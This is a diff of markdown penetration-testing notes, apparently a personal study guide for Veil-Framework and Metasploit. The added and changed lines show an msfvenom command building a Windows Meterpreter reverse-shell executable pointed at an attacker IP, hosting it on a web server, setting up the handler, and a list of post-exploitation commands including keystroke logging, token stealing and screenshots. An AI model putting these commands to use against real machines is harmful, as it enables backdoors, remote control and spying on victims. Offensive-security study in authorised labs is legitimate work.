@@ -280,10 +280,17 @@ sysinfo
 
 Tools: Veil-Framerwork
 
+After Install error
+
+```sh
+If you have any errors running Veil, run: './Veil.py --setup' and select the nuke the wine folder option
+```
+
 Start Veil
 ```sh
-veil
+sudo veil
 ```
+- To generate the payload it needs admin permissions
 
 The two options you have at first are
 - Evasion - used for backdoors
@@ -342,6 +349,7 @@ use exploit/multi/handler
 ```sh
 set PAYLOAD windows/meterpreter/reverse_http
 ```
+- Try, if you get an error, using `windows/meterpreter/reverse_https`
 
 ```sh
 show options
@@ -380,13 +388,13 @@ sessions -i 1
 
 Create windows payload in MSFVenom
 ```sh
-sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=<attacker-ip> LPORT=4444 -o /home/payloads/payload.exe
+sudo msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=<attacker-ip> LPORT=4444 -o /home/payload.exe
 ```
 - Once again we can copy this into our server for easy access.
 
 Move into server
 ```sh
-sudo mv /home/payloads/payload.exe /var/www/html/payloads/
+sudo mv /home/payload.exe /var/www/html/payloads/
 ```
 
 Set up the listener 
@@ -407,6 +415,59 @@ set LHOSTS <attacker-ip>
 ```
 
 You can use the `help` command to list what meterpreter can do
+
+Some basic things we can do:
+
+Get system info
+```sh
+sysinfo
+```
+
+Make a directory
+```sh
+mkdir hello
+```
+
+Delete directory
+```sh
+rmdir hello
+```
+
+See what user we are running as
+```sh
+getuid
+```
+
+Capture keyboard
+```sh
+keyscan_start
+```
+
+Stop capturing keyboard
+```sh
+keyscan_stop
+```
+
+Attempts to steal an impersonation token
+```sh
+steal_token
+```
+
+Display the network connections
+```sh
+netstat
+```
+
+Take screenshot
+```sh
+screenshot
+```
+
+Migrate the server to another process
+```sh
+migrate
+```
+- Doesn't always work
 
 ---
 
